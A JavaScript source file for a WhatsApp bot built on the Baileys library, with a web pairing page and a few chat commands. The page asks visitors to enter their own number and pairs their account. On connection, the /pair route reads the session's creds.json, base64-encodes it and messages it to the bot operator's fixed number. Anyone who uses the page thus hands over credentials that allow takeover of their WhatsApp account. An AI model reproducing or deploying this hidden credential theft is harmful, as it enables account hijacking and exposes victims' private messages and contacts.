import { default as makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion } from '@whiskeysockets/baileys';
import pino from 'pino';
import fs from 'fs';
import path from 'path';
import express from 'express';
import config from './config.js';

const app = express();
app.use(express.json());

// ==========================================
// 1. WEB PAIRING ROUTE & FRONTEND
// ==========================================
app.get('/pair', async (req, res) => {
    let num = req.query.num;
    if (!num) {
        return res.json({ error: "Phone number is required!" });
    }
    num = num.replace(/[^0-9]/g, '');

    const sessionPath = path.join('./session_' + Date.now());

    try {
        const { version } = await fetchLatestBaileysVersion();
        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

        const sock = makeWASocket({
            version,
            auth: state,
            printQRInTerminal: false,
            logger: pino({ level: 'silent' }),
            browser: [config.BOT_NAME, "Chrome", "1.0.0"]
        });

        sock.ev.on('creds.update', saveCreds);

        if (!sock.authState.creds.registered) {
            setTimeout(async () => {
                try {
                    let code = await sock.requestPairingCode(num);
                    let formattedCode = code?.match(/.{1,4}/g)?.join('-') || code;
                    return res.json({ status: true, code: formattedCode });
                } catch (err) {
                    return res.json({ error: "Failed to get pairing code." });
                }
            }, 3000);
        }

        sock.ev.on('connection.update', async (update) => {
            const { connection } = update;
            if (connection === 'open') {
                try {
                    const credsPath = path.join(sessionPath, 'creds.json');
                    if (fs.existsSync(credsPath)) {
                        const credsData = fs.readFileSync(credsPath, 'utf8');
                        const base64Session = Buffer.from(credsData).toString('base64');
                        
                        // Owner ko WhatsApp par Session ID send karna
                        const ownerJid = config.OWNER_NUMBER + "@s.whatsapp.net";
                        await sock.sendMessage(ownerJid, { 
                            text: `💜 *${config.BOT_NAME} NEW SESSION ID* 💜\n\n\`\`\`${base64Session}\`\`\`` 
                        });
                    }
                } catch (e) {
                    console.log("Error sending session to WhatsApp:", e);
                }

                setTimeout(() => {
                    fs.rmSync(sessionPath, { recursive: true, force: true });
                }, 10000);
            }
        });

    } catch (err) {
        return res.json({ error: "Server Error!" });
    }
});

// Homepage UI
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>${config.BOT_NAME} - PAIRING</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { background: #0d0d0d; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
                .card { background: #1a1a1a; padding: 30px; border-radius: 12px; display: inline-block; box-shadow: 0 0 20px rgba(255,7,58,0.4); }
                input { padding: 12px; width: 250px; border-radius: 6px; border: none; text-align: center; font-size: 16px; }
                button { padding: 12px 25px; background: #ff073a; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 10px; }
                #code { margin-top: 20px; font-size: 24px; color: #00ff66; font-weight: bold; }
            </style>
        </head>
        <body>
            <div class="card">
                <h2 style="color: #ff073a;">💜 ${config.BOT_NAME} PAIRING 💜</h2>
                <p>Enter your WhatsApp number with country code:</p>
                <input type="text" id="phone" placeholder="${config.OWNER_NUMBER}"><br>
                <button onclick="getPair()">Get Pairing Code</button>
                <div id="code"></div>
            </div>
            <script>
                async function getPair() {
                    let num = document.getElementById('phone').value;
                    if(!num) return alert('Please enter number!');
                    document.getElementById('code').innerText = 'Generating...';
                    let res = await fetch('/pair?num=' + num);
                    let data = await res.json();
                    if(data.code) {
                        document.getElementById('code').innerHTML = 'PAIRING CODE:<br><span style="color:yellow;">' + data.code + '</span>';
                    } else {
                        document.getElementById('code').innerText = 'Error generating code';
                    }
                }
            </script>
        </body>
        </html>
    `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🌐 Server running on port ${PORT}`));


// ==========================================
// 2. MAIN BOT CORE LOGIC & COMMAND HANDLER
// ==========================================
async function startBot() {
  const { version } = await fetchLatestBaileysVersion();
  const { state, saveCreds } = await useMultiFileAuthState('./session');

  // Load session from SESSION_ID if provided in environment variables
  if (config.SESSION_ID && !fs.existsSync('./session/creds.json')) {
    try {
      console.log("📥 Loading session from SESSION_ID...");
      let sessData = config.SESSION_ID;
      fs.writeFileSync('./session/creds.json', JSON.stringify(JSON.parse(Buffer.from(sessData, 'base64').toString('utf8'))));
      console.log("✅ Session Loaded Successfully!");
    } catch (e) {
      try {
        fs.writeFileSync('./session/creds.json', config.SESSION_ID);
        console.log("✅ Session Loaded Successfully!");
      } catch (err) {
        console.log("⚠️ Invalid SESSION_ID format.");
      }
    }
  }

  const sock = makeWASocket({ 
    version, 
    auth: state, 
    printQRInTerminal: false, 
    logger: pino({ level: 'silent' }), 
    browser: [config.BOT_NAME, 'Chrome', '2.5.0'] 
  });

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'close') {
      const reason = lastDisconnect?.error?.output?.statusCode;
      if (reason !== DisconnectReason.loggedOut) {
        console.log("🔄 Connection lost, reconnecting...");
        startBot();
      } else {
        console.log("❌ Session logged out.");
      }
    } else if (connection === 'open') {
      console.log(`✅ ${config.BOT_NAME} SUCCESSFULLY CONNECTED TO WHATSAPP 💜`);
    }
  });

  // Commands Handler
  sock.ev.on('messages.upsert', async ({ messages }) => {
    const m = messages[0]; 
    if (!m.message || m.key.fromMe) return;
    
    const from = m.key.remoteJid;
    const text = m.message.conversation || m.message.extendedTextMessage?.text || "";
    
    if (!text.startsWith(config.PREFIX)) return;
    
    const args = text.slice(config.PREFIX.length).trim().split(/ +/);
    const cmd = args.shift().toLowerCase();
    
    if (cmd === 'menu' || cmd === 'help') {
      let menu = `┏━━━ 💜 *${config.BOT_NAME}* 💜 ━━━┓\n`;
      menu += `┃ 👑 Owner: ${config.OWNER_NAME}\n`;
      menu += `┃ ⚡ Prefix: [ ${config.PREFIX} ]\n`;
      menu += `┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n`;
      menu += `✨ *COMMANDS:* ✨\n`;
      config.COMMANDS.forEach(c => {
        menu += `> *${config.PREFIX}${c.name}* - ${c.desc}\n`;
      });
      menu += `\n_Powered by ${config.OWNER_NAME}_ 💜`;
      
      await sock.sendMessage(from, { text: menu });
    } 
    else if (cmd === 'ping') {
      await sock.sendMessage(from, { text: 'pong! ⚡ ARSLAN-MD is blazing fast 🚀' });
    } 
    else if (cmd === 'owner') {
      await sock.sendMessage(from, { text: `👑 *Owner Info*\nName: ${config.OWNER_NAME}\nNumber: wa.me/${config.OWNER_NUMBER}` });
    }
    else if (cmd === 'runtime') {
      let uptime = process.uptime();
      let hours = Math.floor(uptime / 3600);
      let minutes = Math.floor((uptime % 3600) / 60);
      let seconds = Math.floor(uptime % 60);
      await sock.sendMessage(from, { text: `⏱️ *Bot Uptime:* ${hours}h ${minutes}m ${seconds}s` });
    }
  });
}

startBot();
